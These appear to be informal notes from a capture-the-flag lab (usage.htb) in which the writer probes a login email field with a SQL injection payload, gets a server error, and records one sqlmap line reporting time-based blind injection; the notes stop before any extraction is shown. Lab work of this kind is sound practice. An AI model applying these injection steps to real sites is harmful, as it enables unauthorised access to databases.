server is running on:

	nginx/1.18.0 (Ubuntu)


a sql union exploit could work for this site if theyre using sql?


i tried doing '-- in the email address field of the usage.htb page. i got a 500 server error.

when i put in random valid looking email addresses, it would say that the email isnt in the records. this means that the field is vulnerable because i was able to send an invalid but syntactically sound sql query
 
i can use my creds:

user: sleepy@gmail.com
pass: sleepy

then inject some other statmenet afterwards to see whats on the database.

inject with a union? i think u might be able to because you get an output message if the email is valid on their database

[01:28:29] [INFO] POST parameter 'email' appears to be 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' injectable



AFTER A LOT OF SQLMAPPING TO FIND THE RIGHT DB TABLE AND COLUMN
